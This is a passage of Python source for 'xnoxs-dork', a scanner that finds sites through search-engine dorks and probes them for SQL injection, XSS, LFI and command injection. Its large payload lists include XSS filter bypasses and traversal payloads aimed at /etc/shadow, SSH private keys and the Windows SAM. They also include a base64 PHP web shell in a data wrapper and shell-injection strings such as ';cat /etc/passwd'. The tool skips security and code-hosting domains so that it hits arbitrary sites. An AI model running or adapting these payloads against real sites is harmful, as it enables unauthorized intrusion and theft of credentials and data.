#!/usr/bin/env python3
"""
xnoxs-dork - SQL Injection & XSS Vulnerability Scanner
A security research tool for detecting SQL injection and XSS vulnerabilities.
For educational and authorized testing purposes only.
"""

import os
import re
import sys
import time
import json
import csv
import argparse
import urllib.parse
import html
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Back, Style, init
import requests
from SearchEngine import GoogleSearch, DuckDuckGoSearch

init(autoreset=True)

thread_lock = threading.Lock()

XSS_PAYLOADS = [
    # Basic payloads
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    # Quote bypass
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '"><img src=x onerror=alert("XSS")>',
    "'><img src=x onerror=alert('XSS')>",
    # Event handlers
    '<body onload=alert("XSS")>',
    '<input autofocus onfocus=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '<video src=x onerror=alert("XSS")>',
    '<audio src=x onerror=alert("XSS")>',
    # SVG advanced
    '<svg><animate onbegin=alert("XSS")>',
    '<svg><set onbegin=alert("XSS")>',
    # Case variation bypass
    '<ScRiPt>alert("XSS")</ScRiPt>',
    '<IMG SRC=x OnErRoR=alert("XSS")>',
    # HTML entity encoding
    '<a href="&#106;avascript:alert(\'XSS\')">Click</a>',
    # Data URI
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    '<object data="javascript:alert(\'XSS\')">',
    # No space bypass
    '<img/src=x/onerror=alert("XSS")>',
    '<svg/onload=alert`XSS`>',
    # Template literals
    '<script>alert`XSS`</script>',
    # Nested tags bypass
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
]

DOM_XSS_SOURCES = [
    r'document\.URL',
    r'document\.documentURI',
    r'document\.URLUnencoded',
    r'document\.baseURI',
    r'location\.href',
    r'location\.search',
    r'location\.hash',
    r'location\.pathname',
    r'document\.cookie',
    r'document\.referrer',
    r'window\.name',
    r'history\.pushState',
    r'history\.replaceState',
    r'localStorage\.',
    r'sessionStorage\.',
]

DOM_XSS_SINKS = [
    r'eval\s*\(',
    r'setTimeout\s*\(',
    r'setInterval\s*\(',
    r'Function\s*\(',
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'\.insertAdjacentHTML\s*\(',
    r'document\.write\s*\(',
    r'document\.writeln\s*\(',
    r'\.src\s*=',
    r'\.href\s*=',
    r'\.action\s*=',
    r'\.data\s*=',
    r'jQuery\s*\(\s*["\']<',
    r'\$\s*\(\s*["\']<',
    r'\.html\s*\(',
    r'\.append\s*\(',
    r'\.prepend\s*\(',
    r'\.after\s*\(',
    r'\.before\s*\(',
]

XSS_DETECTION_PATTERNS = [
    r'<script>alert\(["\']XSS["\']\)</script>',
    r'<img\s+src=x\s+onerror=alert\(["\']XSS["\']\)>',
    r'<svg\s+onload=alert\(["\']XSS["\']\)>',
    r'<body\s+onload=alert\(["\']XSS["\']\)>',
    r'<iframe\s+src=["\']?javascript:alert',
    r'<div\s+onmouseover=["\']alert\(["\']XSS["\']\)["\']>',
    r'onerror\s*=\s*alert\s*\(',
    r'onload\s*=\s*alert\s*\(',
    r'onmouseover\s*=\s*alert\s*\(',
]

SQL_ERROR_PATTERNS = {
    'MySQL': [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc\.exceptions",
        r"You have an error in your SQL syntax",
        r"mysql_fetch_array\(\)",
        r"mysql_num_rows\(\)",
    ],
    'PostgreSQL': [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    'Microsoft SQL Server': [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*mssql_.*",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"Exception.*\WRoadhouse\.Cms\.",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"Unclosed quotation mark after the character string",
        r"ODBC SQL Server Driver",
    ],
    'Oracle': [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",
        r"oracle\.jdbc\.driver",
        r"quoted string not properly terminated",
    ],
    'SQLite': [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_.*",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLITE_MISUSE",
    ],
    'IBM DB2': [
        r"CLI Driver.*DB2",
        r"DB2 SQL error",
        r"\bdb2_\w+\(",
        r"SQLSTATE.+SQLCODE",
    ],
    'Generic': [
        r"SQL syntax.*",
        r"syntax error.*SQL",
        r"unexpected end of SQL command",
        r"invalid query",
        r"SQL command not properly ended",
        r"unterminated quoted string",
    ]
}

settings = {
    'num_results': 100,
    'timeout': 10,
    'threads': 5,
    'filter_enabled': True,
    'filter_categories': ['code_repos', 'forums', 'docs', 'social', 'search_engines', 'cdn']
}

DOMAIN_CATEGORIES = {
    'code_repos': {
        'name': 'Code Repositories',
        'domains': [
            'github.com', 'gitlab.com', 'bitbucket.org', 'sourceforge.net',
            'github.io', 'gitlab.io', 'gist.github.com', 'raw.githubusercontent.com',
            'gitee.com', 'codeberg.org', 'sr.ht', 'git.sr.ht',
            'launchpad.net', 'savannah.gnu.org', 'repo.or.cz',
            'notabug.org', 'codepen.io', 'jsfiddle.net', 'replit.com',
            'codesandbox.io', 'stackblitz.com', 'glitch.com',
        ],
        'patterns': [
            r'.*\.github\.io$',
            r'.*\.gitlab\.io$',
            r'.*\.bitbucket\.io$',
        ]
    },
    'forums': {
        'name': 'Forums & Q&A',
        'domains': [
            'stackoverflow.com', 'stackexchange.com', 'superuser.com',
            'serverfault.com', 'askubuntu.com', 'mathoverflow.net',
            'quora.com', 'reddit.com', 'discourse.org',
            'community.oracle.com', 'answers.microsoft.com',
            'forum.xda-developers.com', 'forums.docker.com',
            'discuss.python.org', 'discuss.elastic.co',
            'laracasts.com', 'dev.to', 'hashnode.com',
        ],
        'patterns': [
            r'.*\.stackexchange\.com$',
            r'forum\..*',
            r'forums\..*',
            r'community\..*',
            r'discuss\..*',
        ]
    },
    'docs': {
        'name': 'Documentation Sites',
        'domains': [
            'docs.python.org', 'docs.oracle.com', 'docs.microsoft.com',
            'developer.mozilla.org', 'w3schools.com', 'tutorialspoint.com',
            'geeksforgeeks.org', 'javatpoint.com', 'programiz.com',
            'learn.microsoft.com', 'cloud.google.com', 'aws.amazon.com',
            'docs.aws.amazon.com', 'docs.docker.com', 'kubernetes.io',
            'reactjs.org', 'vuejs.org', 'angular.io', 'nodejs.org',
            'php.net', 'ruby-doc.org', 'cplusplus.com', 'cppreference.com',
            'devdocs.io', 'readthedocs.io', 'readthedocs.org',
            'medium.com', 'towardsdatascience.com', 'freecodecamp.org',
        ],
        'patterns': [
            r'docs\..*',
            r'.*\.readthedocs\.io$',
            r'.*\.readthedocs\.org$',
            r'wiki\..*',
            r'.*-docs\..*',
        ]
    },
    'social': {
        'name': 'Social Media',
        'domains': [
            'twitter.com', 'x.com', 'facebook.com', 'instagram.com',
            'linkedin.com', 'pinterest.com', 'tumblr.com', 'tiktok.com',
            'youtube.com', 'youtu.be', 'vimeo.com', 'dailymotion.com',
            'twitch.tv', 'discord.com', 'discord.gg', 'slack.com',
            'telegram.org', 't.me', 'whatsapp.com', 'messenger.com',
        ],
        'patterns': []
    },
    'search_engines': {
        'name': 'Search Engines',
        'domains': [
            'google.com', 'bing.com', 'yahoo.com', 'duckduckgo.com',
            'baidu.com', 'yandex.com', 'ask.com', 'aol.com',
            'webcache.googleusercontent.com', 'translate.google.com',
            'search.yahoo.com', 'search.aol.com',
        ],
        'patterns': [
            r'.*\.google\..*',
            r'.*\.bing\..*',
            r'search\..*',
        ]
    },
    'cdn': {
        'name': 'CDN & Static Assets',
        'domains': [
            'cloudflare.com', 'cdn.jsdelivr.net', 'unpkg.com',
            'cdnjs.cloudflare.com', 'ajax.googleapis.com',
            'fonts.googleapis.com', 'fonts.gstatic.com',
            'maxcdn.bootstrapcdn.com', 'cdn.bootcss.com',
            'staticfile.org', 's3.amazonaws.com', 'storage.googleapis.com',
        ],
        'patterns': [
            r'cdn\..*',
            r'.*\.cdn\..*',
            r'static\..*',
            r'assets\..*',
        ]
    },
    'security': {
        'name': 'Security & Scanner Sites',
        'domains': [
            'virustotal.com', 'shodan.io', 'censys.io', 'zoomeye.org',
            'securitytrails.com', 'crt.sh', 'urlscan.io',
            'exploit-db.com', 'cvedetails.com', 'nvd.nist.gov',
            'vulners.com', 'snyk.io', 'hackerone.com', 'bugcrowd.com',
        ],
        'patterns': []
    },
    'pastebin': {
        'name': 'Pastebin Sites',
        'domains': [
            'pastebin.com', 'paste.ee', 'hastebin.com', 'dpaste.org',
            'ghostbin.com', 'justpaste.it', 'paste.mozilla.org',
            'bpaste.net', 'sprunge.us', 'ix.io',
        ],
        'patterns': [
            r'paste\..*',
            r'.*paste.*\..*',
        ]
    }
}

CUSTOM_EXCLUDED_DOMAINS = []
CUSTOM_EXCLUDED_PATTERNS = []
WHITELISTED_DOMAINS = []

filter_stats = {
    'total_checked': 0,
    'total_filtered': 0,
    'by_category': {},
    'by_domain': {}
}

def reset_filter_stats():
    """Reset filtering statistics."""
    global filter_stats
    filter_stats = {
        'total_checked': 0,
        'total_filtered': 0,
        'by_category': {},
        'by_domain': {}
    }

def load_filter_config(filepath='filter_config.json'):
    """Load custom filter configuration from JSON file."""
    global CUSTOM_EXCLUDED_DOMAINS, CUSTOM_EXCLUDED_PATTERNS, WHITELISTED_DOMAINS
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                config = json.load(f)
                CUSTOM_EXCLUDED_DOMAINS = config.get('excluded_domains', [])
                CUSTOM_EXCLUDED_PATTERNS = config.get('excluded_patterns', [])
                WHITELISTED_DOMAINS = config.get('whitelisted_domains', [])
                if config.get('categories'):
                    settings['filter_categories'] = config['categories']
                return True
    except Exception as e:
        print_warning(f"Could not load filter config: {str(e)}")
    return False

def save_filter_config(filepath='filter_config.json'):
    """Save current filter configuration to JSON file."""
    try:
        config = {
            'categories': settings['filter_categories'],
            'excluded_domains': CUSTOM_EXCLUDED_DOMAINS,
            'excluded_patterns': CUSTOM_EXCLUDED_PATTERNS,
            'whitelisted_domains': WHITELISTED_DOMAINS
        }
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        return True
    except Exception as e:
        print_error(f"Could not save filter config: {str(e)}")
        return False

def get_all_excluded_domains():
    """Get all domains to be excluded based on active categories."""
    domains = set()
    for category in settings['filter_categories']:
        if category in DOMAIN_CATEGORIES:
            domains.update(DOMAIN_CATEGORIES[category]['domains'])
    domains.update(CUSTOM_EXCLUDED_DOMAINS)
    return domains

def get_all_excluded_patterns():
    """Get all patterns to be excluded based on active categories."""
    patterns = []
    for category in settings['filter_categories']:
        if category in DOMAIN_CATEGORIES:
            patterns.extend(DOMAIN_CATEGORIES[category]['patterns'])
    patterns.extend(CUSTOM_EXCLUDED_PATTERNS)
    return patterns

def is_whitelisted(url):
    """Check if URL is in whitelist."""
    try:
        parsed = urllib.parse.urlparse(url)
        domain = parsed.netloc.lower()
        for whitelisted in WHITELISTED_DOMAINS:
            if domain == whitelisted or domain.endswith('.' + whitelisted):
                return True
        return False
    except:
        return False

def get_domain_category(domain):
    """Get the category of a domain."""
    domain = domain.lower()
    for category, data in DOMAIN_CATEGORIES.items():
        if category not in settings['filter_categories']:
            continue
        for excl_domain in data['domains']:
            if domain == excl_domain or domain.endswith('.' + excl_domain):
                return category
        for pattern in data['patterns']:
            if re.match(pattern, domain, re.IGNORECASE):
                return category
    if domain in CUSTOM_EXCLUDED_DOMAINS:
        return 'custom'
    for pattern in CUSTOM_EXCLUDED_PATTERNS:
        if re.match(pattern, domain, re.IGNORECASE):
            return 'custom_pattern'
    return None

def is_excluded_domain(url):
    """Check if URL belongs to an excluded domain (advanced version)."""
    if not settings.get('filter_enabled', True):
        return False, None
    
    try:
        parsed = urllib.parse.urlparse(url)
        domain = parsed.netloc.lower()
        
        if is_whitelisted(url):
            return False, None
        
        excluded_domains = get_all_excluded_domains()
        for excl_domain in excluded_domains:
            if domain == excl_domain or domain.endswith('.' + excl_domain):
                category = get_domain_category(domain)
                return True, category
        
        excluded_patterns = get_all_excluded_patterns()
        for pattern in excluded_patterns:
            if re.match(pattern, domain, re.IGNORECASE):
                category = get_domain_category(domain)
                return True, category if category else 'pattern_match'
        
        return False, None
    except:
        return False, None

def filter_urls(urls, verbose=True):
    """Filter out URLs from excluded domains (advanced version with stats)."""
    global filter_stats
    
    if not settings.get('filter_enabled', True):
        return urls
    
    reset_filter_stats()
    filtered = []
    excluded_details = {}
    
    for url in urls:
        filter_stats['total_checked'] += 1
        is_excluded, category = is_excluded_domain(url)
        
        if is_excluded:
            filter_stats['total_filtered'] += 1
            
            if category:
                filter_stats['by_category'][category] = filter_stats['by_category'].get(category, 0) + 1
            
            try:
                domain = urllib.parse.urlparse(url).netloc.lower()
                filter_stats['by_domain'][domain] = filter_stats['by_domain'].get(domain, 0) + 1
                if domain not in excluded_details:
                    excluded_details[domain] = {'count': 0, 'category': category}
                excluded_details[domain]['count'] += 1
            except:
                pass
        else:
            filtered.append(url)
    
    if verbose and filter_stats['total_filtered'] > 0:
        print_filter_stats(excluded_details)
    
    return filtered

def print_filter_stats(excluded_details=None):
    """Print detailed filtering statistics."""
    if filter_stats['total_filtered'] == 0:
        return
    
    print(f"""
    {Fore.YELLOW}╔{'═'*66}╗
    ║{Fore.WHITE}  URL FILTER RESULTS                                              {Fore.YELLOW}║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.YELLOW}║{Fore.WHITE} Total Checked : {filter_stats['total_checked']:<50}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Total Filtered: {Fore.RED}{filter_stats['total_filtered']:<50}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Passed Through: {Fore.GREEN}{filter_stats['total_checked'] - filter_stats['total_filtered']:<50}{Fore.YELLOW}║
    {Fore.YELLOW}╠{'═'*66}╣{Style.RESET_ALL}""")
    
    if filter_stats['by_category']:
        print(f"    {Fore.YELLOW}║{Fore.CYAN} By Category:{' '*54}{Fore.YELLOW}║")
        for category, count in sorted(filter_stats['by_category'].items(), key=lambda x: -x[1]):
            cat_name = DOMAIN_CATEGORIES.get(category, {}).get('name', category.title())
            print(f"    {Fore.YELLOW}║{Fore.WHITE}   • {cat_name}: {Fore.RED}{count:<43}{Fore.YELLOW}║")
    
    if excluded_details:
        top_domains = sorted(excluded_details.items(), key=lambda x: -x[1]['count'])[:5]
        if top_domains:
            print(f"    {Fore.YELLOW}╠{'═'*66}╣{Style.RESET_ALL}")
            print(f"    {Fore.YELLOW}║{Fore.CYAN} Top Filtered Domains:{' '*45}{Fore.YELLOW}║")
            for domain, info in top_domains:
                domain_display = domain[:40] if len(domain) > 40 else domain
                print(f"    {Fore.YELLOW}║{Fore.WHITE}   • {domain_display}: {Fore.RED}{info['count']:<5}{Fore.YELLOW}║")
    
    print(f"    {Fore.YELLOW}╚{'═'*66}╝{Style.RESET_ALL}")

def toggle_filter_category(category):
    """Enable or disable a filter category."""
    if category in settings['filter_categories']:
        settings['filter_categories'].remove(category)
        return False
    else:
        settings['filter_categories'].append(category)
        return True

def add_custom_exclusion(domain_or_pattern, is_pattern=False):
    """Add a custom domain or pattern to exclusion list."""
    if is_pattern:
        if domain_or_pattern not in CUSTOM_EXCLUDED_PATTERNS:
            CUSTOM_EXCLUDED_PATTERNS.append(domain_or_pattern)
            return True
    else:
        if domain_or_pattern not in CUSTOM_EXCLUDED_DOMAINS:
            CUSTOM_EXCLUDED_DOMAINS.append(domain_or_pattern)
            return True
    return False

def add_whitelist(domain):
    """Add a domain to whitelist."""
    if domain not in WHITELISTED_DOMAINS:
        WHITELISTED_DOMAINS.append(domain)
        return True
    return False

def remove_whitelist(domain):
    """Remove a domain from whitelist."""
    if domain in WHITELISTED_DOMAINS:
        WHITELISTED_DOMAINS.remove(domain)
        return True
    return False

def show_filter_settings():
    """Display current filter settings."""
    print(f"""
    {Fore.CYAN}╔{'═'*66}╗
    ║{Fore.WHITE}  ADVANCED URL FILTER SETTINGS                                    {Fore.CYAN}║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.CYAN}║{Fore.WHITE} Filter Status: {Fore.GREEN if settings['filter_enabled'] else Fore.RED}{'ENABLED' if settings['filter_enabled'] else 'DISABLED':<51}{Fore.CYAN}║
    {Fore.CYAN}╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.CYAN}║{Fore.YELLOW} Active Categories:{' '*48}{Fore.CYAN}║""")
    
    for category, data in DOMAIN_CATEGORIES.items():
        status = f"{Fore.GREEN}[ON]" if category in settings['filter_categories'] else f"{Fore.RED}[OFF]"
        domain_count = len(data['domains'])
        pattern_count = len(data['patterns'])
        print(f"    {Fore.CYAN}║{Fore.WHITE}   {status}{Style.RESET_ALL} {data['name']}: {domain_count} domains, {pattern_count} patterns{' ' * (30 - len(data['name']))}{Fore.CYAN}║")
    
    print(f"    {Fore.CYAN}╠{'═'*66}╣{Style.RESET_ALL}")
    print(f"    {Fore.CYAN}║{Fore.YELLOW} Custom Exclusions: {Fore.WHITE}{len(CUSTOM_EXCLUDED_DOMAINS)} domains, {len(CUSTOM_EXCLUDED_PATTERNS)} patterns{' '*25}{Fore.CYAN}║")
    print(f"    {Fore.CYAN}║{Fore.YELLOW} Whitelisted: {Fore.WHITE}{len(WHITELISTED_DOMAINS)} domains{' '*44}{Fore.CYAN}║")
    print(f"    {Fore.CYAN}╚{'═'*66}╝{Style.RESET_ALL}")

all_vulnerabilities = []
all_xss_vulnerabilities = []
all_dom_xss_vulnerabilities = []
all_blind_sqli_vulnerabilities = []
all_lfi_vulnerabilities = []
all_rce_vulnerabilities = []

LFI_PAYLOADS = [
    # Basic Linux traversal
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    # Double encoding bypass
    '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252f..%252f..%252f..%252fetc%252fpasswd',
    # Mixed encoding bypass
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..%e0%80%af..%e0%80%afetc/passwd',
    # Double dots bypass (recursive filter)
    '....//....//....//....//....//etc/passwd',
    r'....\/....\/....\/....\/etc/passwd',
    '..././..././..././..././etc/passwd',
    r'....\\/....\\/....\\/etc/passwd',
    # Direct paths Linux
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/group',
    '/proc/self/environ',
    '/proc/version',
    '/proc/cmdline',
    '/proc/self/fd/0',
    '/var/log/auth.log',
    '/var/log/syslog',
    # Apache/Nginx logs
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/apache/access.log',
    '/var/log/httpd/access_log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    # SSH keys
    '/root/.ssh/id_rsa',
    '/home/www-data/.ssh/id_rsa',
    # Windows paths
    'C:\\Windows\\win.ini',
    'C:\\boot.ini',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'C:\\Windows\\repair\\sam',
    'C:\\Windows\\repair\\system',
    'C:\\xampp\\apache\\logs\\access.log',
    'C:\\inetpub\\wwwroot\\web.config',
    # Windows traversal
    '..\\..\\..\\..\\..\\windows\\win.ini',
    '....\\....\\....\\....\\windows\\win.ini',
    '..\\..\\..\\..\\boot.ini',
    # PHP wrappers
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/convert.base64-encode/resource=../config.php',
    'php://filter/convert.base64-encode/resource=../../config.php',
    'php://filter/read=string.rot13/resource=index.php',
    'php://input',
    'php://stdin',
    # Data wrapper
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    'data://text/plain,<?php phpinfo(); ?>',
    # Expect wrapper
    'expect://id',
    'expect://whoami',
    # File protocol
    'file:///etc/passwd',
    'file:///c:/windows/win.ini',
    # Null byte injection (PHP < 5.3)
    '/etc/passwd%00',
    '/etc/passwd%00.jpg',
    '....//....//....//....//etc/passwd%00',
    '../../../etc/passwd%00.html',
]

LFI_DETECTION_PATTERNS = {
    'Linux /etc/passwd': [
        r'root:.*:0:0:',
        r'root:x:0:0:',
        r'daemon:.*:1:1:',
        r'bin:.*:2:2:',
        r'sys:.*:3:3:',
        r'nobody:.*:65534:',
        r'www-data:.*:33:33:',
        r'apache:.*:48:48:',
        r'nginx:.*:\d+:\d+:',
        r'mysql:.*:\d+:\d+:',
        r'postgres:.*:\d+:\d+:',
        r'[a-z_][a-z0-9_-]*:x:\d+:\d+:',
        r'/bin/bash',
        r'/bin/sh',
        r'/usr/sbin/nologin',
        r'/sbin/nologin',
        r'/bin/false',
    ],
    'Linux /etc/shadow': [
        r'root:\$[0-9a-z]+\$',
        r'root:!:',
        r'root:\*:',
        r'[a-z_][a-z0-9_-]*:\$[156]\$[a-zA-Z0-9./]+:\d+:',
        r'[a-z_][a-z0-9_-]*:!:\d+:\d+:',
    ],
    'Linux /etc/hosts': [
        r'127\.0\.0\.1\s+localhost',
        r'::1\s+localhost',
        r'127\.0\.1\.1\s+',
    ],
    'Linux /etc/group': [
        r'root:x:0:',
        r'daemon:x:1:',
        r'www-data:x:33:',
        r'sudo:x:\d+:',
        r'adm:x:\d+:',
    ],
    'Linux /proc': [
        r'Linux version \d+\.\d+',
        r'BOOT_IMAGE=',
        r'HOME=/',
        r'PATH=/',
        r'USER=www-data',
        r'USER=apache',
        r'DOCUMENT_ROOT=',
        r'SERVER_SOFTWARE=',
        r'SCRIPT_FILENAME=',
    ],
    'Windows win.ini': [
        r'\[extensions\]',
        r'\[fonts\]',
        r'\[mci extensions\]',
        r'for 16-bit app support',
        r'\[Mail\]',
        r'\[files\]',
        r'MAPI=1',
    ],
    'Windows boot.ini': [
        r'\[boot loader\]',
        r'timeout=\d+',
        r'default=multi\(',
        r'\[operating systems\]',
        r'multi\(0\)disk\(0\)',
    ],
    'Windows hosts': [
        r'127\.0\.0\.1\s+localhost',
        r'::1\s+localhost',
        r'# Copyright \(c\) 1993-',
    ],
    'Windows SAM': [
        r'Administrator:500:',
        r'Guest:501:',
        r'IUSR_',
        r'IWAM_',
    ],
    'Apache/Nginx Log': [
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+-\s+-\s+\[',
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*"GET.*HTTP',
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*"POST.*HTTP',
        r'Mozilla/\d+\.\d+',
        r'\[error\].*PHP',
        r'\[warn\]',
        r'\[notice\]',
    ],
    'PHP Source': [
        r'<\?php',
        r'<\?=',
        r'\$_GET\[',
        r'\$_POST\[',
        r'\$_REQUEST\[',
        r'\$_SESSION\[',
        r'\$_COOKIE\[',
        r'\$_SERVER\[',
        r'include\s*\(',
        r'require\s*\(',
        r'include_once\s*\(',
        r'require_once\s*\(',
        r'function\s+\w+\s*\(',
        r'class\s+\w+\s*\{',
    ],
    'Config Files': [
        r'DB_HOST\s*=',
        r'DB_NAME\s*=',
        r'DB_USER\s*=',
        r'DB_PASSWORD\s*=',
        r'DB_PASS\s*=',
        r'database_host',
        r'database_name',
        r'database_user',
        r'mysqli_connect\s*\(',
        r'mysql_connect\s*\(',
        r'PDO\s*\(',
        r'define\s*\(\s*[\'"]DB_',
        r'\$db\s*=\s*[\'"]',
        r'password\s*[\'"]?\s*[:=]\s*[\'"]',
    ],
    'SSH Keys': [
        r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
        r'-----BEGIN RSA PRIVATE KEY-----',
        r'ssh-rsa AAAA',
        r'ssh-dss AAAA',
        r'ssh-ed25519 AAAA',
    ],
}

RCE_PAYLOADS = [
    # Basic command separators - Linux
    (';id', 'uid='),
    ('|id', 'uid='),
    ('||id', 'uid='),
    ('&&id', 'uid='),
    ('& id', 'uid='),
    # Command substitution
    ('`id`', 'uid='),
    ('$(id)', 'uid='),
    ('$(`id`)', 'uid='),
    # Newline/carriage return bypass
    ('%0aid', 'uid='),
    ('%0a id', 'uid='),
    ('%0d%0aid', 'uid='),
    ('\nid', 'uid='),
    ('\n/bin/id', 'uid='),
    # Cat passwd
    (';cat /etc/passwd', 'root:'),
    ('|cat /etc/passwd', 'root:'),
    ('`cat /etc/passwd`', 'root:'),
    ('$(cat /etc/passwd)', 'root:'),
    ('&&cat /etc/passwd', 'root:'),
    # Uname
    (';uname -a', 'Linux'),
    ('|uname -a', 'Linux'),
    ('$(uname -a)', 'Linux'),
    ('`uname -a`', 'Linux'),
    (';uname', 'Linux'),
    # Whoami
    (';whoami', None),
    ('|whoami', None),
    ('`whoami`', None),
    ('$(whoami)', None),
    ('&&whoami', None),
    # List directory
    (';ls -la', 'total'),
    ('|ls -la', 'total'),
    ('`ls -la`', 'total'),
    ('$(ls -la)', 'total'),
    (';ls', None),
    # PWD
    (';pwd', '/'),
    ('|pwd', '/'),
    ('$(pwd)', '/'),
    # Echo test (reliable detection)
    (';echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
    ('|echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
    ('`echo XNOXS_RCE_TEST`', 'XNOXS_RCE_TEST'),
    ('$(echo XNOXS_RCE_TEST)', 'XNOXS_RCE_TEST'),
    ('&&echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
    # Quote escape
    ("';id;'", 'uid='),
    ('";id;"', 'uid='),
    ("';id;echo '", 'uid='),
    ('";id;echo "', 'uid='),
    ("'; echo XNOXS_RCE_TEST; '", 'XNOXS_RCE_TEST'),
    ('"; echo XNOXS_RCE_TEST; "', 'XNOXS_RCE_TEST'),
    # Space bypass (IFS)
    (';cat${IFS}/etc/passwd', 'root:'),
    (';cat$IFS/etc/passwd', 'root:'),
    (';{cat,/etc/passwd}', 'root:'),
    # Ping test
    ('& ping -c 1 127.0.0.1', 'bytes from'),
    ('| ping -c 1 127.0.0.1', 'bytes from'),
    ('; ping -c 1 127.0.0.1', 'bytes from'),
    # Windows commands
    ('& whoami', None),
    ('| whoami', None),
    ('dir', '<DIR>'),
    ('&dir', '<DIR>'),
    ('|dir', '<DIR>'),
    ('& dir', '<DIR>'),
    ('| dir', '<DIR>'),
    ('& type C:\\Windows\\win.ini', '[extensions]'),
    ('| type C:\\Windows\\win.ini', '[extensions]'),
    ('& ipconfig', 'Windows'),
    ('| ipconfig', 'Windows'),
    ('& hostname', None),
    ('| hostname', None),
    # Curl/wget detection
    (';curl --version', 'curl'),
    ('|wget --version', 'wget'),
]

RCE_DETECTION_PATTERNS = [
    r'uid=\d+\([a-zA-Z0-9_-]+\)\s+gid=\d+',
    r'uid=\d+\s+gid=\d+',
    r'uid=\d+',
    r'root:.*:0:0:',
    r'root:x:0:0:',
    r'www-data',
    r'apache',
    r'nginx',
    r'nobody',
    r'Linux\s+\S+\s+\d+\.\d+',
    r'Linux\s+version\s+\d+',
    r'Darwin\s+\S+\s+\d+\.\d+',
    r'FreeBSD\s+\S+\s+\d+\.\d+',
    r'Ubuntu',
    r'Debian',
    r'CentOS',
    r'Red Hat',
    r'Fedora',
    r'total\s+\d+',
    r'drwx[rwx-]{6}',
    r'-rw[rwx-]{7}',
    r'lrwx[rwx-]{6}',
    r'd[rwx-]{9}',
    r'-[rwx-]{9}',
    r'XNOXS_RCE_TEST',
    r'bytes from 127\.0\.0\.1',
    r'bytes from localhost',
    r'\d+ bytes from',
    r'64 bytes from',
    r'Reply from 127\.0\.0\.1',
    r'<DIR>\s+\.',
    r'\[extensions\]',
    r'Volume in drive',
    r'Directory of',
    r'Windows IP Configuration',
    r'Ethernet adapter',
    r'IPv4 Address',
    r'Default Gateway',
    r'Microsoft Windows',
    r'curl \d+\.\d+',
    r'wget \d+\.\d+',
    r'GNU Wget',
    r'/var/www',
    r'/home/',
    r'/usr/',
    r'/bin/',
    r'/tmp/',
    r'/root/',
    r'C:\\\\Windows',
    r'C:\\\\Users',
    r'C:\\\\Program Files',
    r'bin/bash',
    r'bin/sh',
    r'sbin/nologin',
]

SAMPLE_DORKS = {
    'SQL Injection': [
        'inurl:php?id=',
        'inurl:index.php?id=',
        'inurl:product.php?id=',
        'inurl:news.php?id=',
        'inurl:article.php?id=',
        'inurl:view.php?id=',
        'inurl:page.php?id=',
        'inurl:category.php?id=',
        'inurl:item.php?id=',
        'inurl:gallery.php?id=',
    ],
    'LFI (Local File Inclusion)': [
        'inurl:page= filetype:php',
        'inurl:file= filetype:php',
        'inurl:include= filetype:php',
        'inurl:document= filetype:php',
        'inurl:folder= filetype:php',
        'inurl:path= filetype:php',
        'inurl:pg= filetype:php',
        'inurl:style= filetype:php',
        'inurl:template= filetype:php',
        'inurl:php?load=',
        'inurl:php?read=',
        'inurl:php?content=',
